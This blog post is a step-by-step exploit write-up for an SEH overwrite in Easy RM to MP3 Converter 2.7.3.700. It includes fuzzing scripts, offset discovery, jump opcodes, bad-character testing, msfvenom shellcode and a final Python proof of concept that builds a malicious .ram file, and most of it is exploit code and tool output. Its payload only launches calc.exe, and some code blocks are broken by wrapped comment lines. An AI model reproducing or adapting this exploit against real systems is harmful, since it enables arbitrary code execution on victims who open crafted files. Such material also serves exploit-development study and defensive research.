---
layout: post
title: Easy RM to MP3 Converter 2.7.3.700 - Structured Exception Handling Overwrite
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# Preamble
Welcome again! Today i will be explaining a vulnerability i have found within this software, which i have found while gathering in [Exploit-DB](https://www.exploit-db.com/exploits/39933).

# The Bug
Easy RM to MP3 Converter in version 2.7.3.700 suffers from multiple Buffer Overflows and SEH overwrites, meaning that arbitrary code execution can be leveraged through crafted files. Due this software can process different types of files such as ram, rm, smi, wax, wvx, wvm, and so forth, such exploitation can be done through such extensions. This will be explained further within this post.

To begin, a small fuzzing script is created, which will create a file named as "finding2.ram", containing 50 thousand bytes of A's:

```term_session
import struct

buffer = "A" * 50000

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

After the script is run and the application is started, click 'Cancel'

![](/assets/img/Findings2/0.png)

The button 'Load' is selected:

![](/assets/img/Findings2/1.png)

Select the file created by the script, making the program to load the malicious file, and as a result, crashing:

![](/assets/img/Findings2/2.png)

![](/assets/img/Findings2/3.png)

SEH Chain:

![](/assets/img/Findings2/4.png)

A pattern is created with msf-pattern_create into a file called "pattern":

```term_session
root@kali:~# msf-pattern_create -l 50000 > pattern 
root@kali:~# 
```

Such chain of bytes is copied into the PoC.

Updated PoC:

![](/assets/img/Findings2/5.png)

After this is copied, executed and finally selected by the program, the SEH Chain gives the next values:

![](/assets/img/Findings2/6.png)

The nSEH value is copied and the offset is found using msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 66473965 -l 50000 
[*] Exact match at offset 4828
[*] Exact match at offset 25108
[*] Exact match at offset 45388
root@kali:~# 
```

As it is seen on the image, the program outputs different offsets, let's try with the last one, 45388.

Updated PoC:

```term_session
import struct

buffer = "A" * 45388 + "BBBB" + "CCCC"

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

After the aforementioned process is once again repeated, the SEH Chain is overwritten by the desired values:

![](/assets/img/Findings2/7.png)

The modules are listed:

![](/assets/img/Findings2/8.png)

Despite the great variety of possible modules to pick in order to find a reliable POP POP RETN address, this is a SEH Overwrite in which it does not need further bytes after the POP POP RETN sequence in order to generate an exception, as a result, making it possible to exploit this application with a 3-byte overwrite, which would be a great demostration within this blog post. In this case, the module with a base address along with a NULL-byte is "RM2MP3Converter.exe".

Listing possible POP POP RETN sequences within the module "RM2MP3Converter.exe":

![](/assets/img/Findings2/8-2.png)

The first address is chosen and copied within the PoC. Furthermore, a short jump backwards is added:

```term_session
import struct

nseh = "\xEB\x06\x90\x90"
seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)

buffer = "A" * 45388 + nseh + seh

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

After the process is yet once again re-done, the SEH Chain is overwritten by the short jump, and by the POP-POP-RETN sequence, meaning that the overwritting: method has successfully worked.

![](/assets/img/Findings2/9.png)

Clicking twice the SE Handler (RM2MP3Co.0040563C)

Takes us to the POP-POP-RETN sequence:

![](/assets/img/Findings2/10.png)

## Hijacking the power

The next thing to do is to add a long jump before the nSEH, meaning that as soon as the execution continues, the short jump will lead execution to the long jump, going backwards within the buffer. In this case, i decided that 5000 bytes should be a good distance:

```term_session
root@kali:~# msf-nasm_shell 
nasm > JMP -5000 
00000000  E973ECFFFF        jmp 0xffffec78
nasm > 
```

Additionally, INC3 bytes will be embedded between the A's, meaning that if a breakpoint is matched within such bytes, the jump had worked as planned.

Updated PoC:

```term_session
import struct

sjmp = "\xE9\x73\xEC\xFF\xFF"
nseh = "\xEB\xF9\x90\x90"
seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)

buffer = "A" * 44000 + "\xcc" * 200 + "A" * (45388 - 44000 - 205) + sjmp + nseh + seh

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

Right after pressing SHIFT+F9, the execution stops on INC3 bytes:

![](/assets/img/Findings2/11.png)

The offset has been found, execution has been granted, what's next? Bad characters.

## Bad Characters

The INC3 bytes are removed by a chain of bad characters:

```term_session
import struct

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

sjmp = "\xE9\x73\xEC\xFF\xFF"
nseh = "\xEB\xF9\x90\x90"
seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)

buffer = "A" * 44000 + "w00tw00t" + badchars  + "A" * (45388 - 44000 - 205 - 8) + sjmp + nseh + seh

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```

In addition, a small tag (w00tw00t) was added, such will help to find the bad characters when it's time to compare with mona.

Bad characters are generated with mona:

![](/assets/img/Findings2/12.png)

After such are sent, the tag is found with mona:

![](/assets/img/Findings2/13.png)

The address is copied and followed within the Stack:

![](/assets/img/Findings2/15.png)

![](/assets/img/Findings2/16.png)

![](/assets/img/Findings2/17.png)

Comparing the bad characters with mona:

![](/assets/img/Findings2/18.png)

As seen, the byte 09 is taken as a bad character. Normally, 09 is not a bad character, on the other hand, 0a, which is the following byte to 09, is normally a terrible character as it means "line feed", used for CRLF combination. It is probable that 09 is being detected for such reason.

If the process is yet repeated, 0a is taken as a bad character:

![](/assets/img/Findings2/19.png)

If the chain is yet once again sent without either 0a, but with 09 in it, the bytes are processed without any issue:

![](/assets/img/Findings2/20.png)

## Last but not least, shellcode

The final part, shellcode is generated:

```term_session
root@kali:~# msfvenom -p windows/exec CMD=calc.exe -f py -b "\x00\x0a" EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of py file: 1078 bytes
buf =  b""
buf += b"\xbf\xb8\xc2\xd4\x1e\xdb\xc9\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x31\x83\xc2\x04\x31\x7a\x0f\x03\x7a\xb7\x20"
buf += b"\x21\xe2\x2f\x26\xca\x1b\xaf\x47\x42\xfe\x9e\x47\x30"
buf += b"\x8a\xb0\x77\x32\xde\x3c\xf3\x16\xcb\xb7\x71\xbf\xfc"
buf += b"\x70\x3f\x99\x33\x81\x6c\xd9\x52\x01\x6f\x0e\xb5\x38"
buf += b"\xa0\x43\xb4\x7d\xdd\xae\xe4\xd6\xa9\x1d\x19\x53\xe7"
buf += b"\x9d\x92\x2f\xe9\xa5\x47\xe7\x08\x87\xd9\x7c\x53\x07"
buf += b"\xdb\x51\xef\x0e\xc3\xb6\xca\xd9\x78\x0c\xa0\xdb\xa8"
buf += b"\x5d\x49\x77\x95\x52\xb8\x89\xd1\x54\x23\xfc\x2b\xa7"
buf += b"\xde\x07\xe8\xda\x04\x8d\xeb\x7c\xce\x35\xd0\x7d\x03"
buf += b"\xa3\x93\x71\xe8\xa7\xfc\x95\xef\x64\x77\xa1\x64\x8b"
buf += b"\x58\x20\x3e\xa8\x7c\x69\xe4\xd1\x25\xd7\x4b\xed\x36"
buf += b"\xb8\x34\x4b\x3c\x54\x20\xe6\x1f\x32\xb7\x74\x1a\x70"
buf += b"\xb7\x86\x25\x24\xd0\xb7\xae\xab\xa7\x47\x65\x88\x48"
buf += b"\xaa\xac\xe4\xe0\x73\x25\x45\x6d\x84\x93\x89\x88\x07"
buf += b"\x16\x71\x6f\x17\x53\x74\x2b\x9f\x8f\x04\x24\x4a\xb0"
buf += b"\xbb\x45\x5f\xd3\x5a\xd6\x03\x3a\xf9\x5e\xa1\x42"
root@kali:~# 
```
# EndGame

![](/assets/img/Findings2/21.png)

Final PoC:

```term_session
import struct

# msfvenom -p windows/exec CMD=calc.exe -f py -b "\x00\x0a" EXITFUNC=thread 
# Payload size: 220 bytes

buf =  b""
buf += b"\xbf\xb8\xc2\xd4\x1e\xdb\xc9\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x31\x83\xc2\x04\x31\x7a\x0f\x03\x7a\xb7\x20"
buf += b"\x21\xe2\x2f\x26\xca\x1b\xaf\x47\x42\xfe\x9e\x47\x30"
buf += b"\x8a\xb0\x77\x32\xde\x3c\xf3\x16\xcb\xb7\x71\xbf\xfc"
buf += b"\x70\x3f\x99\x33\x81\x6c\xd9\x52\x01\x6f\x0e\xb5\x38"
buf += b"\xa0\x43\xb4\x7d\xdd\xae\xe4\xd6\xa9\x1d\x19\x53\xe7"
buf += b"\x9d\x92\x2f\xe9\xa5\x47\xe7\x08\x87\xd9\x7c\x53\x07"
buf += b"\xdb\x51\xef\x0e\xc3\xb6\xca\xd9\x78\x0c\xa0\xdb\xa8"
buf += b"\x5d\x49\x77\x95\x52\xb8\x89\xd1\x54\x23\xfc\x2b\xa7"
buf += b"\xde\x07\xe8\xda\x04\x8d\xeb\x7c\xce\x35\xd0\x7d\x03"
buf += b"\xa3\x93\x71\xe8\xa7\xfc\x95\xef\x64\x77\xa1\x64\x8b"
buf += b"\x58\x20\x3e\xa8\x7c\x69\xe4\xd1\x25\xd7\x4b\xed\x36"
buf += b"\xb8\x34\x4b\x3c\x54\x20\xe6\x1f\x32\xb7\x74\x1a\x70"
buf += b"\xb7\x86\x25\x24\xd0\xb7\xae\xab\xa7\x47\x65\x88\x48"
buf += b"\xaa\xac\xe4\xe0\x73\x25\x45\x6d\x84\x93\x89\x88\x07"
buf += b"\x16\x71\x6f\x17\x53\x74\x2b\x9f\x8f\x04\x24\x4a\xb0"
buf += b"\xbb\x45\x5f\xd3\x5a\xd6\x03\x3a\xf9\x5e\xa1\x42"

sjmp = "\xE9\x73\xEC\xFF\xFF"
nseh = "\xEB\xF9\x90\x90"
seh = "\x3C\x56\x40" # 0x0040563c : pop ebx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [RM2MP3Converter.exe] 
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.7.3.700 (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)

buffer = "A" * 44000 + buf + "A" * (45388 - 44000 - len(buf) - 5) + sjmp + nseh + seh

f = open ("finding2.ram", "w")
f.write(buffer)
f.close()
```
